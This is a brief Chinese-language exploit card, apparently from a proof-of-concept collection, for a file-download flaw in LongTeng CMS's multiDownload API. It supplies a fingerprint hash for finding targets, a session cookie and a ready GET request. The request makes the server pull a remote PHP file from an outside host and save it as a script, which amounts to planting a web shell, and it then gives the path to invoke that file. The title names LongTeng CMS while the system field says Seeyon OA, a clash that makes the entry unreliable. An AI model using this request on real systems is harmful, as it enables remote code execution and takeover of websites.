# 龙腾CMSmultiDownload存在文件下载漏洞致远程命令执行

- **系统**：致远OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="-803002403"`
- **请求**：`GET /api/file/multiDownload?file=http://ip/1.php&savePath=dsg15ds6g1sd.php HTTP/1.1`
- **关键头**：`Host: demo.ltcms.com`　`Cookie: cms_session=uck8lfsr72os4v8oblfa74upli`　`Priority: u=0, i`

**请求体 / payload**
```
/dsg15ds6g1sd.php
```
- **预期**：200　|　—